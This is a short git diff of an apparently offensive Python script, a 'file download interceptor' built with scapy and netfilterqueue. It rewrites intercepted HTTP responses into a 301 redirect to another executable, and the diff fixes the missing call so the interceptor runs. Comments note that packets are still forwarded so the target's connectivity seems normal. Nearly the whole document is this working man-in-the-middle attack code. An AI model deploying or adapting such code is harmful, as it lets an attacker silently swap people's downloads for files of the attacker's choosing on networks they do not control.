@@ -40,6 +40,7 @@ def process_packet(packet):
                     ack_list.remove(scapy_packet[scapy.TCP].seq)
                     print("++Replacing file")
                     modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab.com/rar/wrar571.exe\n\n")
+                    
                     packet.set_payload(str(modified_packet))
 
     packet.accept() #forward packets to target, connectivity seems normal
@@ -49,7 +50,7 @@ try:
         set_iptables()
         queue = netfilterqueue.NetfilterQueue()
         queue.bind(0, process_packet)
-        queue.run
+        queue.run()
 except KeyboardInterrupt:
     print("\n[+] Stopping file download interceptor")
     restore_iptables()
